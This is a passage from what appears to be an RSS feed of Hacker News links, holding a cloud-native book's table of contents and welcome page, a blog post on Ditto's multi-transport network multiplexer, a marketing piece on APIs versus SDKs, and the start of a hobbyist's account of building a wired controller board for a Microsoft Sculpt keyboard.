aria-hidden="true">7.3.2.</strong> Vertical Pod Autoscaler</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/service-scaling/horizontal-pod-autoscaler.html"><strong aria-hidden="true">7.3.3.</strong> Horizontal Pod Autoscaler</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/cluster-autoscaler.html"><strong aria-hidden="true">7.4.</strong> Cluster autoscaler</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/extensibility.html"><strong aria-hidden="true">7.5.</strong> Extensibility</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/extensibility/webhooks.html"><strong aria-hidden="true">7.5.1.</strong> Webhooks</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/extensibility/controllers.html"><strong aria-hidden="true">7.5.2.</strong> Controllers</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/extensibility/crds.html"><strong aria-hidden="true">7.5.3.</strong> Custom Resource Definitions</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/extensibility/operators.html"><strong aria-hidden="true">7.5.4.</strong> Operators</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/extensibility/api-server-aggregation.html"><strong aria-hidden="true">7.5.5.</strong> API Server aggregation</a></li></ol></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration.html"><strong aria-hidden="true">8.</strong> Continuous integration</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing.html"><strong aria-hidden="true">8.1.</strong> Testing</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/unit-tests.html"><strong aria-hidden="true">8.1.1.</strong> Unit tests</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/integration-tests.html"><strong aria-hidden="true">8.1.2.</strong> Integration tests</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/integration-tests/narrow-integration-tests.html"><strong aria-hidden="true">8.1.2.1.</strong> Narrow integration tests</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/integration-tests/broad-integration-tests.html"><strong aria-hidden="true">8.1.2.2.</strong> Broad integration tests</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/functional-tests.html"><strong aria-hidden="true">8.1.3.</strong> Functional tests</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/end-to-end-tests.html"><strong aria-hidden="true">8.1.4.</strong> End to end tests</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/acceptance-tests.html"><strong aria-hidden="true">8.1.5.</strong> Acceptance tests</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/performance-tests.html"><strong aria-hidden="true">8.1.6.</strong> Performance tests</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/testing/smoke-tests.html"><strong aria-hidden="true">8.1.7.</strong> Smoke tests</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/build-artifacts.html"><strong aria-hidden="true">8.2.</strong> Build artifacts</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-integration/container-image-registry.html"><strong aria-hidden="true">8.3.</strong> Container image registry</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-delivery.html"><strong aria-hidden="true">9.</strong> Continuous delivery</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-delivery/ci-driven.html"><strong aria-hidden="true">9.1.</strong> CI driven</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/continuous-delivery/gitops.html"><strong aria-hidden="true">9.2.</strong> GitOps</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/observability.html"><strong aria-hidden="true">10.</strong> Observability</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/observability/monitoring.html"><strong aria-hidden="true">10.1.</strong> Monitoring</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/observability/logging.html"><strong aria-hidden="true">10.2.</strong> Logging</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/observability/tracing.html"><strong aria-hidden="true">10.3.</strong> Tracing</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/observability/metrics.html"><strong aria-hidden="true">10.4.</strong> Metrics</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/patterns.html"><strong aria-hidden="true">11.</strong> Patterns</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/patterns/api-gateway.html"><strong aria-hidden="true">11.1.</strong> API Gateway</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/patterns/service-mesh.html"><strong aria-hidden="true">11.2.</strong> Service Mesh</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/security.html"><strong aria-hidden="true">12.</strong> Security</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/security/rbac.html"><strong aria-hidden="true">12.1.</strong> RBAC</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/security/container-runtime.html"><strong aria-hidden="true">12.2.</strong> Container runtime</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/security/network-isolation.html"><strong aria-hidden="true">12.3.</strong> Network isolation</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/security/container-image-scanners.html"><strong aria-hidden="true">12.4.</strong> Container image scanners</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/security/api-server-audit.html"><strong aria-hidden="true">12.5.</strong> API Server Audit</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/debugging.html"><strong aria-hidden="true">13.</strong> Debugging</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/advanced-concepts.html"><strong aria-hidden="true">14.</strong> Advanced Concepts</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/advanced-concepts/virtual-kubelet.html"><strong aria-hidden="true">14.1.</strong> Virtual Kubelet</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/advanced-concepts/deprecation-policy.html"><strong aria-hidden="true">14.2.</strong> Deprecation Policy</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper">

            <div class="page">
                
                <div id="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div>
                            
                            
                            <ul id="theme-list" aria-label="Themes" role="menu">
                                <li role="none"></li>
                                <li role="none"></li>
                                <li role="none"></li>
                                <li role="none"></li>
                                <li role="none"></li>
                            </ul>
                            
                            
                            
                        </div>

                        

                        <div>
                            <a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper">
                    <form id="searchbar-outer">
                        
                    </form>
                    <div id="searchresults-outer">
                        <div id="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                

                <div id="content">
                    <main>
                        
<blockquote>
<p><strong>Note:</strong> This book is a collaborative effort and it is expected to be in
continuous evolution. It is open for contributions at any time. Make
it better, make it yours.</p>
</blockquote>
<p>Welcome to the <em>Applications in a cloud native world</em> book. This book
will try to outline best practices when developing containerized and
cloud native services.</p>
<p>In order to lay out the foundations we will focus on, we first need to
consider how services have historically been managed.</p>
<p>Let's then jump straight to the <a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/basics.html">Basics</a>.</p>

                    </main>

                    <nav aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        
                            <a rel="next" href="https://ereslibre.github.io/applications-in-a-cloud-native-world/basics.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i></i>
                            </a>
                        

                        <div></div>
                    </nav>
                </div>
            </div>

            <nav aria-label="Page navigation">
                

                
                    <a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/basics.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i></i>
                    </a>
                
            </nav>

        </div>

        

        

        
        
        
        
        

        

        
        
        
        
        

        
        
        

        <!-- Custom JS scripts -->
        

        

    

</div>]]>
            </description>
            <link>https://ereslibre.github.io/applications-in-a-cloud-native-world/welcome.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26221189</guid>
            <pubDate>Mon, 22 Feb 2021 05:26:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Multiplexing Multipath P2P Mobile Transports]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26220942">thread link</a>) | @bigfish24
<br/>
February 21, 2021 | https://www.ditto.live/blog/posts/the-new-network-multiplexer | <a href="https://web.archive.org/web/*/https://www.ditto.live/blog/posts/the-new-network-multiplexer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><nav aria-label="breadcrumb"><ol><li><a href="https://www.ditto.live/">Home</a></li><li><a href="https://www.ditto.live/blog/posts">Blog</a></li><li><a href="https://www.ditto.live/blog/posts/the-new-network-multiplexer">The New Network Multiplexer </a></li></ol></nav><p>Since the first versions of Ditto, devices always made multiple connections to other peers. For example, two iOS devices will try to connect simultaneously over WiFi, Apple Wireless Direct Link (AWDL), and Bluetooth Low Energy (BLE). We make multiple connections because each transport has different characteristics such as throughput and distance. For example, Bluetooth Low Energy works over long distances but has little bandwidth. AWDL has much more bandwidth but the devices need to be close together.</p>
<p>In the example below we see two iPhones syncing over AWDL and BLE. As one device gets further from the other, the AWDL connection will degrade and disconnect while the BLE connection sustains longer distances.</p>

<h2 id="pre-version-1.0.0">Pre-Version 1.0.0</h2>
<p>Before version 1.0.0, Ditto created a unique replication session for every transport. This is the software component which tracks queries and data changes and ensures that every Ditto device stays in sync. These separate replication pathways can appear or disappear as connections come and go, without disrupting sibling sessions.</p>
<p>When there is new data to sync, a session packs that data into an update file. With multiple concurrent sessions, all of them would then race against each other to transmit that update file as quickly as possible, regardless of duplication between transports. Transactional locking on the internal database made sure that only one session at a time could modify the update file, which prevented race conditions. Since any session is able to maintain the update file, any individual session can fail and replication will always continue, providing a high level of reliability.</p>
<p><img src="https://www.ditto.live/assets/blog/posts/the-new-network-multiplexer/old-way.svg" alt="old-way-sessions"></p>
<p>In this benchmark we see the consequences of each session sending data eagerly over every transport. In an attempt to send a document with about 2 megabytes of data, all five connected modes of transport aggressively sent data as fast as they could. We can see that the highly efficient AWDL transports could send all bytes first, and the remote peer quickly notified the slower connections that they could stop. However, the slower transports had already sent duplicate bytes. In the end, the peer had sent 5.4 megabytes even though the document size was about 2 megabytes. This was 2.6 times larger than the initial payload. Furthermore, this fully occupied the BLE radio, consuming bandwidth that could have been better used by a Bluetooth-only peer.</p>
<div>
  <table>
    <thead>
      <tr>
        <th>Transport</th>
        <th>Bytes Sent</th>
        <th>Packets Sent</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>AWDL Client</td>
        <td>2097944</td>
        <td>33</td>
      </tr>
      <tr>
        <td>AWDL Server</td>
        <td>2097944</td>
        <td>33</td>
      </tr>
      <tr>
        <td>BLE Client</td>
        <td>12288</td>
        <td>16</td>
      </tr>
      <tr>
        <td>BLE Server</td>
        <td>12288</td>
        <td>16</td>
      </tr>
      <tr>
        <td>TCP Server</td>
        <td>1170432</td>
        <td>36</td>
      </tr>
      <tr>
        <td>Grand Total</td>
        <td>5390896</td>
        <td>134</td>
      </tr>
    </tbody>
  </table>
</div>


<p>In version 1.0.0, we’ve introduced a completely new system for creating sync sessions between peers we call the multiplexer. Our first order of business was to reduce the duplication of sessions to the same peer over multiple transport types. We’ve introduced the concept of a virtual connection between two peers. No matter how many transport connections are active, there will only be one virtual connection and only one session. Now incoming data is buffered and intermediated from the transport layer to a single virtual connection.</p>
<p><img src="https://www.ditto.live/assets/blog/posts/the-new-network-multiplexer/new-way.svg" alt="new-way-multiplexer"></p>
<p>This new architecture allows each virtual connection to intelligently send data over multiple physical transports with fine-grained control. For example, the multiplexer can switch active transports on the fly without unnecessary duplication.</p>
<p>In this example:</p>
<ol>
<li>The multiplexer on the left device deemed that TCP (WiFi) was the best transport to start sending data.</li>
<li>Suddenly, the infastructure WiFi goes out, and the multiplexer switches to AWDL.</li>
<li>As the device moves away from its peer, AWDL is lost and the multiplexer switches to BLE.</li>
<li>The devices move closer together and the multiplexer finishes the rest of the transmission over AWDL.</li>
</ol>

<p>Now the total bytes sent is equal to the size of the update file.</p>
<div>
  <table>
    <thead>
      <tr>
        <th>Transport</th>
        <th>Bytes Sent</th>
        <th>Packets Sent</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>AWDL Client</td>
        <td>524288</td>
        <td>8</td>
      </tr>
      <tr>
        <td>AWDL Server</td>
        <td>234264</td>
        <td>4</td>
      </tr>
      <tr>
        <td>BLE Client</td>
        <td>0</td>
        <td>0</td>
      </tr>
      <tr>
        <td>BLE Server</td>
        <td>421888</td>
        <td>206</td>
      </tr>
      <tr>
        <td>TCP Server</td>
        <td>917504</td>
        <td>28</td>
      </tr>
      <tr>
        <td>Grand Total</td>
        <td>2097944</td>
        <td>246</td>
      </tr>
    </tbody>
  </table>
</div>

<p>The introduction of the multiplexer is a gigantic step forward for Ditto's networking capabilities. Today, it focuses on using one transport at a time but this new foundation allows us to build even more powerful, dynamic and flexible replication techniques such as using multiple transports at a time over unreliable connections, streaming use cases, and decentralized data sync techniques reminiscent of BitTorrent.</p>
</div></div></div>]]>
            </description>
            <link>https://www.ditto.live/blog/posts/the-new-network-multiplexer</link>
            <guid isPermaLink="false">hacker-news-small-sites-26220942</guid>
            <pubDate>Mon, 22 Feb 2021 04:43:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[API vs. SDK explained in restaurant terms]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26220862">thread link</a>) | @alexander_kir
<br/>
February 21, 2021 | https://www.amity.co/blog/api-vs-sdk-which-is-which | <a href="https://web.archive.org/web/*/https://www.amity.co/blog/api-vs-sdk-which-is-which">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Software Development Kits (SDK) and Application Programming Interface (API) are critical components of your app’s development. However, these two terms sometimes overlap, often leading to confusion.&nbsp;<br></p><p>Knowing their differences and how you can take advantage of them can significantly help you improve your application. This piece tackles their distinct features and outlines how you can utilize them to supercharge your app.&nbsp;<br></p><h3><strong>What is an API?&nbsp;&nbsp;</strong></h3><p>By definition, APIs are sets of instructions and protocols used to integrate specific functionalities into an application. An API can help connect your apps or projects to external services, enabling seamless data transfer and adding a new feature altogether.&nbsp;<br></p><p>Let’s take a look at this example from software company <a href="https://www.mulesoft.com/resources/api/what-is-an-api">Mulesoft</a> explaining the function of an API:&nbsp;&nbsp;</p><blockquote><em>Imagine you’re sitting at a table in a restaurant with a menu of choices to order from. The kitchen is the part of the “system” that will prepare your order. What is missing is the critical link to communicate your order to the kitchen and deliver your food back to your table. That’s where the waiter or API comes in. The waiter is the messenger – or API – that takes your request or order and tells the kitchen – the system – what to do. Then the waiter delivers the response back to you; in this case, it is the food.</em><br></blockquote><p>With an API, developers don’t have to worry about creating lots of custom code to enable functionalities, as various APIs exist to fulfill a specific function. As <a href="https://www.ibm.com/cloud/learn/api?utm_medium=OSocial&amp;utm_source=Youtube&amp;utm_content=000023UA&amp;utm_term=10010608&amp;utm_id=YTDescription-101-API-vs-SDK-LH-API-Guide&amp;cm_mmc=OSocial_Youtube-_-Cloud+and+Data+Platform_SFT+Cloud+Platform+Digital-_-WW_WW-_-YTDescription-101-API-vs-SDK-LH-API-Guide&amp;cm_mmca1=000023UA&amp;cm_mmca2=10010608">IBM</a> mentioned, APIs allow companies to open up their applications’ data and functionality for third-party developers to use. So if you have a food delivery app and want to verify your user’s number, provide the location, and enable payment without leaving the platform, there’s an available phone, maps, and payment API to perform these actions.&nbsp;<br></p><h3><strong>What is an SDK?&nbsp;</strong></h3><p>On the other hand, SDKs are a set of tools used to develop applications for a specific platform. <a href="https://www.redhat.com/en/topics/cloud-native-apps/what-is-SDK">Red Hat</a> mentioned that a typical SDK contains a compiler, debugger, as well as APIs, and any of the following:<br></p><ul role="list"><li>Documentation</li><li>Libraries</li><li>Editors</li><li>Runtime/development environments</li><li>Testing/analysis tools</li><li>Drivers</li><li>Network protocols<br></li></ul><p>Let’s take the restaurant scenario again. For example, you are a chef. When you’re cooking a dish, you will need ingredients for your recipe; you need the kitchen utensils so you can cook, you need a copy of a recipe to put the meal together, and so on. In the same way, SDK provides all the things you need to create your intended application.&nbsp;<br></p><p>SDKs are crucial when developing an app for a specific platform. For instance, Apple provides iOS SDKs to developers so they can create applications specifically for iOS. An SDK should add value to a developer. Hence it should be easy to use, provides a thorough explanation of the code used, and adds functionality to an existing app.&nbsp;<br></p><h4><strong>Things to remember&nbsp;</strong></h4><p>Now that we defined both, let us recap:&nbsp;<br></p><ul role="list"><li>APIs facilitates the communication and integration of software</li></ul><ul role="list"><li>SDK provides the foundation to build an application specifically for a platform</li></ul><ul role="list"><li>SDKs contain APIs; APIs don’t contain SDKs<br></li></ul><p>API, as a part of an SDK, is lightweight and specialized based on the function intended. Meanwhile, SDKs have a collection of utilities to create a new application or add new functionalities.&nbsp;<br></p><h3><strong>API and SDK can elevate your app&nbsp;</strong></h3><p>Now that we know the differences, how can you take advantage of both to improve your app?&nbsp;<br></p><p>Utilizing SDKs with the APIs that meet your needs can significantly enhance your application’s functionality. According to <a href="https://marketfinder.thinkwithgoogle.com/intl/en/guide/improve-ux-ui-of-app/#overview">Google</a>, mobile users spend nine out of ten minutes using only their top five favorite apps. So how can your app be one of their top five?&nbsp;&nbsp;<br></p><p>SDKs can enable powerful in-app features with the corresponding APIs that will substantially affect your app’s user experience. With so many apps out there, you would want yours to stand out in the app market.&nbsp;<br></p><p>And of course, you just don’t want users to download your app; you would like them to keep and share it with their peers, creating a loyal fanbase for your application.&nbsp;<br></p><p>If you are a brand and you aim to engage and retain your users, adding <a href="https://www.amity.co/blog/remain-competitive-by-adding-social-features-to-your-app">social features with an SDK </a>to your app can help raise user engagement through <a href="https://www.amity.co/blog/building-your-in-app-community-why-it-matters">in-app groups.</a> Meanwhile, integrating chat SDK into your application can facilitate 1-on-1 conversations or group interactions, allowing you to host online communities.&nbsp;<br></p><p><a href="https://www.amity.co/products/amity-video">Video SDKs</a> can help you integrate in-app live streaming and stories to your product if you have an entertainment application.&nbsp; So whether it’s a sports event or a concert broadcasted in your app, this solution can help bring throngs of fans to use your application. On the other hand, if your SDK has a <a href="https://www.amity.co/products/amity-bots">chatbot</a> API that can collect user data, you can use the information you have to create a more personalized user experience, push tailored notifications, and deliver the right content to your users.<br></p><p>In conclusion, API and SDK, regardless of their differences, can both be beneficial for your application. Using SDK with the right APIs can create numerous possibilities to improve your application. Now is the time to find the best SDKs to enhance your in-app user experience, engagement, and retention.&nbsp;<br></p></div></div>]]>
            </description>
            <link>https://www.amity.co/blog/api-vs-sdk-which-is-which</link>
            <guid isPermaLink="false">hacker-news-small-sites-26220862</guid>
            <pubDate>Mon, 22 Feb 2021 04:28:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Turning a wireless keyboard into a wired keyboard]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26220556">thread link</a>) | @todsacerdoti
<br/>
February 21, 2021 | https://chadaustin.me/2021/02/wired-sculpt/ | <a href="https://web.archive.org/web/*/https://chadaustin.me/2021/02/wired-sculpt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>I made a control board for the Microsoft Sculpt wireless keyboard that converts it to wired USB, and now my favorite keyboard is even better.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/finished-board.jpeg"><img src="https://chadaustin.me/images/sculpt/finished-board.jpeg" alt="The finished and installed board."></a>
<figcaption>The finished and installed board.</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/messy-desk.jpeg"><img src="https://chadaustin.me/images/sculpt/messy-desk.jpeg" alt="Wired keyboard and the resulting project mess!"></a>
<figcaption>Wired keyboard and the resulting project mess!</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/underside.jpeg"><img src="https://chadaustin.me/images/sculpt/underside.jpeg" alt="USB cable and reset button."></a>
<figcaption>USB cable and reset button.</figcaption>
</figure>

<p>The QMK config is available at <a href="https://github.com/chadaustin/qmk_firmware">@chadaustin/qmk_firmware</a> (<a href="https://github.com/chadaustin/qmk_firmware/tree/master/keyboards/handwired/sculpt">keyboards/handwired/sculpt/</a>), and the PCB design files at <a href="https://github.com/chadaustin/wired-sculpt-pcb">@chadaustin/wired-sculpt-pcb</a>.</p>

<p>I’m planning on making at least one more, so if you’d like one, maybe I can help.</p>

<p>It’s a huge improvement. Latency is reduced by about 13 milliseconds, and with full control over the microcontroller’s firmware, you can customize keymaps and layers, and actually use the keyboard’s built-in LEDs.</p>

<h2 id="why">Why?</h2>

<p>Feel free to stop reading here — I am going to tell the sequence of events that led to this project. Besides some exposure to basic voltage and resistance circuits in college, I have very little electronics background. But, in a short time, I went from only barely knowing what a capacitor was to having a working PCB manufactured and assembled, and maybe this will inspire someone else to give it a try.</p>

<p>Since developing RSI in college, I’ve exclusively used Microsoft’s ergonomic keyboards. And when I first tried the Sculpt, I instantly knew it was the best yet. The soft actuation, short key travel, and rigid frame are perfect for my hands. And because the number pad is a separate device, the distance to my mouse is shortened.</p>

<p>My brother went out and bought one too. Not much later, he gave it to me, saying the latency was inconsistent and high, and it was unacceptable for gaming. I thought he was being uniquely sensitive, since I had no problem in either Linux, Windows 7, or macOS. But then I updated to Windows 10 and saw exactly what he meant.</p>

<p>It was like the keyboard would go to sleep if a key wasn’t pressed for a few seconds, and the first keypress after a wake would be delayed or, worse, dropped.</p>

<p>And heaven forbid I use my USB 3 hub, whose EMI would disrupt the 2.4 GHz signal, and <em>every other</em> keypress would be unreliable. I’d gone as far as mounting the wireless transceiver directly under my keyboard, on the underside of my desk, and keys were still dropped.</p>

<p>So, best keyboard ever. But wireless sucks. (But mostly in Windows 10? No idea about that.)</p>

<h2 id="over-the-hump">Over the Hump</h2>

<p>What started this whole thing is that the <a href="https://github.com/facebookexperimental/eden/#edenfs">EdenFS</a> team was a bunch of keyboard enthusiasts. During the pandemic, as we’re all at home burning out and missing each other, we were trying to think of some virtual team offsites. Wez offered to walk everyone through building a <a href="https://www.1upkeyboards.com/instructions-downloads/sweet-16-instructions/">Sweet 16 Macro Pad</a>.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/sweet-16.jpeg"><img src="https://chadaustin.me/images/sculpt/sweet-16.jpeg" alt="Assembled Sweet 16 underside"></a>
<figcaption>Assembled Sweet 16 underside. This is take two, after resoldering and cleaning the whole thing. Take one was a bit of a mess.</figcaption>
</figure>

<p>So, okay, a keyboard is a matrix, with some diodes used to disambiguate the signalling, and a microcontroller that rapidly polls the matrix and reports events over USB…</p>

<p>So maybe I could fix the Sculpt! I bought a transceiver-less Sculpt off eBay for cheap and <a href="http://emmanuelcontreras.com/how-to/how-to-disassemble-microsoft-sculpt-ergonomic-keyboard-and-make-it-wired/">popped it open (thanks Emmanuel Contreras!)</a>, thinking maybe its controller could be flashed with new firmware that speaks USB. The Sculpt uses a <a href="https://infocenter.nordicsemi.com/pdf/nRF24LE1_PS_v1.6.pdf">Nordic Semiconductor nRF24LE1</a>, but I was nowhere near capable of making use of that information at the time, though it did point me to Samy Kamkar’s horrifying guide on <a href="https://samy.pl/keysweeper/">surreptitiously sniffing keystrokes from nearby (older) Microsoft wireless keyboards</a>.</p>

<p>I almost gave up here, but Per Vognsen <a href="https://twitter.com/pervognsen/status/1322422385174220800">suggested I scan the matrix myself</a> and it turns out Michael Fincham had already <a href="https://www.reddit.com/r/MechanicalKeyboards/comments/bhkgnp/modification_photos_qmk_wired_microsoft_sculpt/">mapped out the matrix and soldered a Teensy 2.0++ board onto the Sculpt’s test pads</a>, showing this was doable!</p>

<p>So I ordered my own microcontroller to try the same thing.</p>

<p>First, I bought an Arduino Pro Micro, like the Sweet 16 uses. Oh hey, 18 GPIO pins isn’t enough to drive the Sculpt’s 26-pin matrix. I looked at using an I2C GPIO expander, but it felt like taking on too much.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/pro-micro.jpeg"><img src="https://chadaustin.me/images/sculpt/pro-micro.jpeg" alt="Arduino Pro Micro"></a>
<figcaption>Arduino Pro Micro. Wait, you need pins to scan a matrix?</figcaption>
</figure>

<p>More pins? QMK’s Proton C has more pins! So I carefully soldered onto the test pads as Michael had shown was possible… and it worked!</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/proton-c.jpeg"><img src="https://chadaustin.me/images/sculpt/proton-c.jpeg" alt="QMK Proton C"></a>
<figcaption>QMK Proton C. It's a beautiful board.</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/test-pads.jpeg"><img src="https://chadaustin.me/images/sculpt/test-pads.jpeg" alt="Soldering test pads to Proton C."></a>
<figcaption>Soldering test pads to Proton C.</figcaption>
</figure>

<figure>
<a href="https://chadaustin.me/images/sculpt/all-test-pads.jpeg"><img src="https://chadaustin.me/images/sculpt/all-test-pads.jpeg" alt="All test pads connected to Proton C. It works!"></a>
<figcaption>All test pads connected to Proton C. It works!</figcaption>
</figure>

<p>Getting those wires to stick to the pads without shorting was tricky. (I hadn’t yet discovered how magical flux is.)</p>

<p>The keyboard worked, but I couldn’t fit the board, its wires, and the new microcontroller into the case, and I wasn’t <em>really</em> happy leaving it in this state, even if I could pack it in somehow.</p>

<p>I thought, all I <em>really</em> need is the ribbon cable connector, so I ordered a 30 pin, 1.0 mm pitch ribbon breakout and the pricier (but tons of pins!) <a href="https://www.pjrc.com/store/teensypp.html">Teensy 2.0++</a>. Looking back, it’s cute that I was trying to save $10 on the microcontroller… You just have to get used to spending money on whatever saves you time.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/breakout-and-teensy.jpeg"><img src="https://chadaustin.me/images/sculpt/breakout-and-teensy.jpeg" alt="Ribbon cable breakout and Teensy 2.0++"></a>
<figcaption>Ribbon cable breakout and Teensy 2.0++</figcaption>
</figure>

<p>Well, it was almost as annoying to solder, and still didn’t fit. So much for saving money on microcontrollers.</p>

<p>I thought about giving up. Is it really that bad that my keys don’t always register in games? Can I just tolerate some flakiness and latency?</p>

<p>But Jon Watte offered to spend an entire day showing me how to use KiCad, design circuits, layout PCBs, select components on Digi-Key, scan datasheets for the important information, and how to work with a PCB manufacturing house. Of course you never turn down opportunities like that.</p>

<h2 id="designing-the-final-board---schematic">Designing the Final Board - Schematic</h2>

<p>Assuming, like me, you’ve never done this, I’ll summarize the steps.</p>

<p>First you sketch out the circuit schematic.</p>

<figure>
<a href="https://chadaustin.me/images/sculpt/schematic.png"><img src="https://chadaustin.me/images/sculpt/schematic.png" alt="Schematic"></a>
<figcaption>Schematic in KiCad. Most of this was informed by the datasheet and Atmel's design guides.</figcaption>
</figure>

<p>Jon showed me several tricks in KiCad, like global labels, and starting with some standard resistor and capacitor values, but it’s very important that you go through the datasheets, because details can matter a ton.</p>

<p>I knew I wanted the main processor to be the AT90USB1286 controller, and fortunately KiCad already had a symbol for it. Atmel has a comprehensive and accessible data sheet, which showed me I needed some 22 Ω resistors on the USB data lines, which of the ISP programmer lines needed resistors (and appropriate values), and that I needed to either pull HWB low, or provide a physical switch that pulls it low, in order to allow rebooting the device into USB firmware update mode.</p>

<p>There are a bunch of things that are implicitly known to electrical engineers but that were new to me. You want:</p>

<ul>
  <li>a ground plane under the data lines and most of the microcontroller if possible.</li>
  <li>an electrolytic or tantalum bypass capacitor on the main 5V power from USB.</li>
  <li>ceramic filter capacitors on each power pin.</li>
  <li>appropriate values for the resonance capacitors on your crystal.</li>
  <li>electrostatic discharge protection! Turns out transients are common and it’s easy to fry a chip just by plugging it in.</li>
</ul>

<p>And then when you get into concerns like EMI and high-frequency signal integrity, the rabbit hole goes deep.</p>

<p>I kept having to tell myself “it’s just a keyboard”, but it also helped that there are a great number of high-quality resources on these topics just a click away. I spent lots of time on <a href="https://www.eevblog.com/">EEVBlog</a>.</p>

<p>Before finishing the circuit design, Jon had me do a couple smart things. In case the factory-supplied USB bootloader didn’t work out, he suggested I add the footprint (but not a connector!) for an ISP programmer and a debug LED to prove code would work at all.</p>

<h2 id="designing-the-final-board---physical-layout">Designing the Final Board - Physical Layout</h2>

<p>After arranging the schematic and ensuring it passed the electrical rules check, it was time to pick specific components. That is, the reference to a 220 Ω resistor is replaced with the Panasonic ERJ-3EKF2200V, 0603 surface mount.</p>

<p>There are a couple things to keep in mind. For common components, like resistors and ceramic capacitors, there is a huge amount of choice. For example, I see over 1400 surface-mount 220 Ω resistors on digikey. I tried to just stick with one high-quality brand like Panasonic or Samsung for all of that stuff.</p>

